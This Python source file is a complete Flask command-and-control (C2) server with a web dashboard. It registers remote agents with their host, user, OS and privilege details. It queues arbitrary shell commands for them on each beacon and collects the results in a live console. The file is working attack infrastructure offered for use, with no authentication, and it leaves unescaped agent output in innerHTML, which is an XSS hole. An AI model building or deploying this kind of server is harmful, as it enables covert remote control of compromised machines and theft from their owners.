#!/usr/bin/env python3
"""
Complete C2 Framework Server
Supports multiple agents, task management, and real-time console
"""

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
import uuid
import time
import threading
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

# Data storage
agents = {}
tasks = {}
task_results = {}

# HTML Dashboard
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Framework Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            height: 100vh;
            overflow: hidden;
        }
        .container { display: flex; height: 100vh; }
        .sidebar {
            width: 350px;
            background: #0d1117;
            border-right: 1px solid #00ff41;
            overflow-y: auto;
            padding: 20px;
        }
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .terminal {
            background: #000000;
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .command-bar {
            background: #0d1117;
            border-top: 1px solid #00ff41;
            padding: 15px;
            display: flex;
        }
        .command-bar input {
            background: #000000;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 10px;
            flex: 1;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .command-bar button {
            background: #00ff41;
            color: #000000;
            border: none;
            padding: 10px 20px;
            margin-left: 10px;
            cursor: pointer;
            font-weight: bold;
        }
        .agent-item {
            padding: 10px;
            margin: 5px 0;
            background: #1a1f2e;
            cursor: pointer;
            border-left: 3px solid #00ff41;
        }
        .agent-item:hover { background: #2a2f3e; }
        .agent-item.active { background: #00ff41; color: #000000; }
        .agent-info { font-size: 11px; margin-top: 5px; color: #888; }
        .status-active { color: #00ff41; }
        .status-inactive { color: #ff4444; }
        .command-output { color: #cccccc; margin: 5px 0 5px 20px; white-space: pre-wrap; }
        .command-line { color: #00ff41; margin: 5px 0; }
        h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 1px solid #00ff41; padding-bottom: 5px; }
        .badge {
            display: inline-block;
            padding: 2px 6px;
            font-size: 10px;
            border-radius: 3px;
            margin-left: 5px;
        }
        .badge-windows { background: #0078d4; color: white; }
        .badge-linux { background: #fcc624; color: black; }
        .badge-mac { background: #555555; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <div class="sidebar">
            <h2>🕶️ C2 Framework v1.0</h2>
            <div id="agents-list">
                <div style="text-align: center; padding: 20px;">Loading agents...</div>
            </div>
        </div>
        <div class="main">
            <div class="terminal" id="terminal">
                <div class="command-line">=== C2 Framework Console ===</div>
                <div class="command-line">Type 'help' for commands | Select agent first</div>
                <div class="command-line">================================</div>
                <div id="output-area"></div>
            </div>
            <div class="command-bar">
                <input type="text" id="command-input" placeholder="Enter command..." autocomplete="off">
                <button onclick="sendCommand()">Execute</button>
            </div>
        </div>
    </div>

    <script>
        let currentAgent = null;
        
        function loadAgents() {
            fetch('/api/agents')
                .then(res => res.json())
                .then(data => {
                    const container = document.getElementById('agents-list');
                    if (data.length === 0) {
                        container.innerHTML = '<div style="text-align: center; padding: 20px;">No agents connected</div>';
                        return;
                    }
                    
                    container.innerHTML = '<h3>Active Agents (' + data.length + ')</h3>';
                    data.forEach(agent => {
                        const agentDiv = document.createElement('div');
                        agentDiv.className = 'agent-item';
                        if (currentAgent === agent.agent_id) agentDiv.classList.add('active');
                        agentDiv.onclick = () => selectAgent(agent.agent_id);
                        
                        let osBadge = '';
                        if (agent.os_type === 'Windows') osBadge = '<span class="badge badge-windows">Windows</span>';
                        else if (agent.os_type === 'Linux') osBadge = '<span class="badge badge-linux">Linux</span>';
                        else if (agent.os_type === 'Darwin') osBadge = '<span class="badge badge-mac">macOS</span>';
                        
                        agentDiv.innerHTML = `
                            <div><strong>${agent.agent_id}</strong> ${osBadge}</div>
                            <div class="agent-info">
                                ${agent.hostname} | ${agent.username}<br>
                                IP: ${agent.ip_address} | Last: ${agent.last_seen || 'Just now'}
                            </div>
                        `;
                        container.appendChild(agentDiv);
                    });
                });
        }
        
        function selectAgent(agentId) {
            currentAgent = agentId;
            addToTerminal(`[+] Selected agent: ${agentId}`, 'info');
            loadAgents();
        }
        
        function addToTerminal(text, type = 'output') {
            const outputArea = document.getElementById('output-area');
            const line = document.createElement('div');
            if (type === 'command') {
                line.innerHTML = `<div class="command-line">${currentAgent ? currentAgent + '# ' : ''}${text}</div>`;
            } else if (type === 'info') {
                line.innerHTML = `<div style="color: #00ff41;">${text}</div>`;
            } else {
                line.innerHTML = `<div class="command-output">${text}</div>`;
            }
            outputArea.appendChild(line);
            const terminal = document.getElementById('terminal');
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function sendCommand() {
            const input = document.getElementById('command-input');
            const command = input.value.trim();
            if (!command) return;
            if (!currentAgent) {
                addToTerminal('[-] No agent selected!', 'info');
                input.value = '';
                return;
            }
            
            addToTerminal(command, 'command');
            
            fetch('/api/send_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ agent_id: currentAgent, command: command })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'sent') {
                    addToTerminal(`[+] Command sent (Task ID: ${data.task_id})`, 'info');
                } else {
                    addToTerminal('[-] Failed to send command', 'info');
                }
            });
            
            input.value = '';
        }
        
        function fetchResults() {
            if (currentAgent) {
                fetch(`/api/task_results/${currentAgent}`)
                    .then(res => res.json())
                    .then(data => {
                        data.forEach(result => {
                            addToTerminal(result.output);
                        });
                    });
            }
        }
        
        document.getElementById('command-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCommand();
        });
        
        setInterval(loadAgents, 3000);
        setInterval(fetchResults, 2000);
        loadAgents();
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/register', methods=['POST'])
def register_agent():
    """Register a new agent"""
    try:
        data = request.json
        agent_id = str(uuid.uuid4())[:8]
        
        agents[agent_id] = {
            'agent_id': agent_id,
            'hostname': data.get('hostname', 'unknown'),
            'username': data.get('username', 'unknown'),
            'os_type': data.get('os_type', 'unknown'),
            'os_version': data.get('os_version', 'unknown'),
            'ip_address': data.get('ip_address', request.remote_addr),
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'status': 'active',
            'working_dir': data.get('working_dir', '/'),
            'privilege_level': data.get('privilege_level', 'user')
        }
        
        print(f"[+] New agent registered: {agent_id} ({data.get('hostname')})")
        return jsonify({'agent_id': agent_id, 'sleep_time': 5, 'status': 'registered'})
        
    except Exception as e:
        print(f"[-] Registration error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/beacon', methods=['POST'])
def handle_beacon():
    """Handle agent beacon"""
    try:
        data = request.json
        agent_id = data.get('agent_id')
        
        if agent_id in agents:
            agents[agent_id]['last_seen'] = datetime.now().isoformat()
            agents[agent_id]['status'] = 'active'
            
            # Get pending tasks for this agent
            pending_tasks = []
            for task_id, task in tasks.items():
                if task['agent_id'] == agent_id and task['status'] == 'pending':
                    pending_tasks.append({
                        'id': task_id,
                        'command': task['command']
                    })
                    task['status'] = 'sent'
            
            return jsonify({'tasks': pending_tasks, 'status': 'ok'})
        else:
            return jsonify({'error': 'Agent not found'}), 404
            
    except Exception as e:
        print(f"[-] Beacon error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/task_result', methods=['POST'])
def receive_task_result():
    """Receive task execution result"""
    try:
        data = request.json
        task_id = data.get('task_id')
        output = data.get('output', '')
        
        if task_id in tasks:
            tasks[task_id]['status'] = 'completed'
            tasks[task_id]['output'] = output
            tasks[task_id]['completed_at'] = datetime.now().isoformat()
            
            # Store result for console display
            agent_id = tasks[task_id]['agent_id']
            if agent_id not in task_results:
                task_results[agent_id] = []
            task_results[agent_id].append({
                'task_id': task_id,
                'command': tasks[task_id]['command'],
                'output': output,
                'timestamp': datetime.now().isoformat()
            })
            
            print(f"[+] Task {task_id} completed for agent {agent_id}")
        
        return jsonify({'status': 'received'})
        
    except Exception as e:
        print(f"[-] Task result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_command', methods=['POST'])
def send_command():
    """Send command to agent (API endpoint for console)"""
    try:
        data = request.json
        agent_id = data.get('agent_id')
        command = data.get('command')
        
        if agent_id not in agents:
            return jsonify({'error': 'Agent not found'}), 404
        
        task_id = str(uuid.uuid4())[:8]
        tasks[task_id] = {
            'id': task_id,
            'agent_id': agent_id,
            'command': command,
            'status': 'pending',
            'created_at': datetime.now().isoformat()
        }
        
        print(f"[+] Command sent to {agent_id}: {command[:50]}")
        return jsonify({'task_id': task_id, 'status': 'sent'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/agents', methods=['GET'])
def list_agents():
    """List all registered agents"""
    agent_list = []
    for agent_id, info in agents.items():
        agent_list.append({
            'agent_id': agent_id,
            'hostname': info.get('hostname', 'unknown'),
            'username': info.get('username', 'unknown'),
            'os_type': info.get('os_type', 'unknown'),
            'ip_address': info.get('ip_address', 'unknown'),
            'last_seen': info.get('last_seen', ''),
            'status': info.get('status', 'unknown')
        })
    return jsonify(agent_list)

@app.route('/api/task_results/<agent_id>', methods=['GET'])
def get_task_results(agent_id):
    """Get task results for an agent"""
    results = task_results.get(agent_id, [])
    # Return only new results and clear them
    task_results[agent_id] = []
    return jsonify(results)

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    """Get pending tasks for agent (simple endpoint)"""
    pending = []
    for task_id, task in tasks.items():
        if task['agent_id'] == agent_id and task['status'] == 'pending':
            pending.append({
                'id': task_id,
                'command': task['command']
            })
    return jsonify(pending)

if __name__ == '__main__':
    print("="*60)
    print("C2 Framework Server Starting...")
    print("="*60)
    print(f"[*] Dashboard: http://0.0.0.0:5000")
    print(f"[*] API Endpoint: http://0.0.0.0:5000/api")
    print("[*] Press Ctrl+C to stop")
    print("="*60)
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
